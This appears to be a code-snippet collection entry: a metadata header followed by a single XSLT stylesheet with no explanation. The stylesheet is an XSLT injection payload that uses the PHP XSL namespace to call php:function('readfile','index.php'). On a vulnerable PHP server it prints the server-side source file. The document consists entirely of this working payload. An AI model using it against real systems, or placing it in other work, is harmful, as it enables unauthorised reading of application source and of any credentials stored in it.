---
id: 13c8b4d5-1b28-4eee-bc93-d3983d22b1cb
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:41.543076+00:00'
updated_at: '2023-04-10T20:24:49.324314+00:00'
---

# Code Snippet 13c8b4d5

**Language**: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
<xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```
